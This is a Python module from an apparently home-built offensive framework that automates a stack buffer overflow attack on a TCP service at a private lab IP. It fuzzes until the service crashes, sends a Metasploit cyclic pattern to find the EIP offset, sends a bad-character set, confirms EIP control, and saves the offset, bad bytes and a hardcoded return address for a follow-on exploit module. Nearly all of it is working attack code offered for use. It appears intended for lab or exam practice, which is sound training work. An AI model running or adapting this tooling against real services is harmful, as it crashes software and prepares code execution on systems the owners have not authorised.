"""
modules/buffer_overflow/benjis_snack_vault_analysis.py
Guided buffer overflow analysis: fuzz → pattern → offset → badchars → EIP control test
"""

import json
import socket
import subprocess
import time
from base_module import BaseModule
from utils import colored


class BenjisSnackVaultAnalysis(BaseModule):
    def __init__(self):
        super().__init__()
        self.name        = "benjis_snack_vault_analysis"
        self.description = "Guided BoF analysis: fuzz, cyclic pattern, offset, badchars, EIP control"

        self.options = {
            "RHOST":          {"value": "192.168.107.132", "required": True,  "description": "Target IP"},
            "RPORT":          {"value": 9999,              "required": True,  "description": "Target port"},
            "PREFIX":         {"value": "MEOW ",           "required": True,  "description": "Command prefix sent before payload"},
            "MODE":           {"value": "full",            "required": True,  "description": "full | fuzz | pattern | badchars | test_offset"},
            "PATTERN_LENGTH": {"value": 3000,              "required": False, "description": "Cyclic pattern length"},
            "OFFSET":         {"value": 0,                 "required": False, "description": "EIP offset (auto-set in full mode)"},
        }

        self._results_file = "analysis_results.json"

    # ------------------------------------------------------------------
    # Help
    # ------------------------------------------------------------------
    def show_help(self):
        print(colored("\n=== Buffer Overflow Analysis Module ===", "orange"))
        print(self.description)
        print("\nRecommended workflow:")
        print("  set MODE full → run   (walks through every step interactively)")
        print("\nIndividual modes:")
        print("  fuzz         - Send increasing junk bytes until crash")
        print("  pattern      - Send cyclic pattern to find EIP offset")
        print("  badchars     - Send all characters to identify bad bytes")
        print("  test_offset  - Confirm EIP control with BBBB")
        print("\nCommands:")
        print("  run / exploit        - Execute selected MODE")
        print("  set <option> <value> - Set an option")
        print("  show options         - Show current settings")
        print("  back / exit          - Return to framework\n")

    # ------------------------------------------------------------------
    # Command dispatcher
    # ------------------------------------------------------------------
    def handle_command(self, cmd_input: str):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) == 3:
                self.set_option(parts[1], parts[2])
            else:
                print("Usage: set <option> <value>")
            return

        if low in ["run", "exploit"]:
            self.run()
            return

        if low in ["back", "exit", "quit"]:
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    # ------------------------------------------------------------------
    # run() — dispatch by MODE
    # ------------------------------------------------------------------
    def run(self):
        mode = str(self.options["MODE"]["value"]).lower()
        dispatch = {
            "full":        self._run_full,
            "fuzz":        self._run_fuzz,
            "pattern":     self._run_pattern,
            "badchars":    self._run_badchars,
            "test_offset": self._run_test_offset,
        }
        if mode not in dispatch:
            print(colored(f"[-] Unknown MODE '{mode}'. Choose: full | fuzz | pattern | badchars | test_offset", "red"))
            return
        dispatch[mode]()

    # ------------------------------------------------------------------
    # Full guided chain
    # ------------------------------------------------------------------
    def _run_full(self):
        print(colored("=== Full Guided Analysis ===", "green"))
        input("Press Enter to begin fuzzing...")

        self._run_fuzz()
        self._wait_for_restart("Fuzz crashed the app. Re-launch and re-attach Immunity Debugger.")

        self._run_pattern()
        self._wait_for_restart("Pattern sent. Re-launch and re-attach Immunity Debugger.")

        eip = input(colored("Enter EIP value from Immunity (8 hex chars): ", "yellow")).strip().upper()
        offset = self._calc_offset(eip, int(self.options["PATTERN_LENGTH"]["value"]))
        if offset is not None:
            self.options["OFFSET"]["value"] = offset
            print(colored(f"[+] OFFSET set to {offset}", "green"))
        else:
            return

        self._wait_for_restart("Ready for badchars. Re-launch and re-attach Immunity.")
        self._run_badchars()

        self._wait_for_restart("Badchars sent. Re-launch and re-attach Immunity.")
        self._run_test_offset()

        self._save_results()
        print(colored("\n=== Analysis complete. Results saved to analysis_results.json ===", "green"))
        print("You can now run the exploit module.")

    # ------------------------------------------------------------------
    # Individual steps
    # ------------------------------------------------------------------
    def _run_fuzz(self):
        print(colored("[*] Fuzzing ...", "yellow"))
        for size in range(100, 5000, 200):
            payload = self._build_payload(b"A" * size)
            print(f"  Sending {size} bytes ...", end="", flush=True)
            if self._send(payload):
                print(" OK")
            else:
                print(colored(" CRASH", "red"))
                print(colored(f"[!] Approximate crash size: {size} bytes", "green"))
                return
            time.sleep(0.2)

    def _run_pattern(self):
        length = int(self.options["PATTERN_LENGTH"]["value"])
        print(colored(f"[*] Generating {length}-byte cyclic pattern ...", "yellow"))
        try:
            pattern = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
                text=True,
            ).strip().encode()
        except Exception as exc:
            print(colored(f"[-] pattern_create.rb failed: {exc}", "red"))
            return
        self._send(self._build_payload(pattern))
        print(colored("[+] Pattern sent.", "green"))

    def _calc_offset(self, eip_hex: str, length: int) -> int | None:
        try:
            result = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb",
                 "-q", eip_hex, "-l", str(length)],
                text=True,
            ).strip()
            if "Exact match at offset" in result:
                offset = int(result.split()[-1])
                print(colored(f"[+] Exact match at offset {offset}", "green"))
                return offset
            print(colored(f"[-] No exact match: {result}", "red"))
        except Exception as exc:
            print(colored(f"[-] pattern_offset.rb failed: {exc}", "red"))
        return None

    def _run_badchars(self):
        offset = int(self.options["OFFSET"]["value"])
        if offset == 0:
            print(colored("[-] OFFSET is 0 — set it first.", "red"))
            return
        badchars = bytearray(b for b in range(1, 256) if b not in [0x00, 0x09, 0x0A, 0x0D])
        payload  = self._build_payload(b"A" * offset + b"BBBB" + badchars)
        self._send(payload)
        print(colored("[+] Badchars sent. Inspect ESP dump in Immunity.", "green"))

    def _run_test_offset(self):
        offset = int(self.options["OFFSET"]["value"])
        if offset == 0:
            print(colored("[-] OFFSET is 0 — set it first.", "red"))
            return
        payload = self._build_payload(b"A" * offset + b"BBBB" + b"C" * 300)
        self._send(payload)
        print(colored("[+] Sent. EIP should read 42424242 in Immunity.", "green"))

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _build_payload(self, body: bytes) -> bytes:
        prefix = self.options["PREFIX"]["value"].encode()
        return prefix + body + b"\r\n"

    def _send(self, payload: bytes) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.options["RHOST"]["value"], int(self.options["RPORT"]["value"])))
            s.send(payload)
            s.close()
            return True
        except Exception:
            return False

    def _test_connection(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.options["RHOST"]["value"], int(self.options["RPORT"]["value"])))
            s.close()
            return True
        except Exception:
            return False

    def _wait_for_restart(self, message: str):
        print(colored(f"\n[!] {message}", "red"))
        while True:
            input("Press Enter to test connection ...")
            if self._test_connection():
                print(colored("[+] Target is up — continuing.", "green"))
                return
            print(colored("[-] Still unreachable — restart the app and try again.", "red"))

    def _save_results(self):
        data = {
            "OFFSET":   int(self.options["OFFSET"]["value"]),
            "BADCHARS": "\\x00\\x09\\x0a\\x0d",
            "RET":      "0x114015f3",
            "PREFIX":   self.options["PREFIX"]["value"],
            "TARGET":   self.options["RHOST"]["value"],
        }
        try:
            with open(self._results_file, "w") as fh:
                json.dump(data, fh, indent=2)
            print(colored(f"[+] Results saved to {self._results_file}", "green"))
        except Exception as exc:
            print(colored(f"[-] Could not save results: {exc}", "red"))
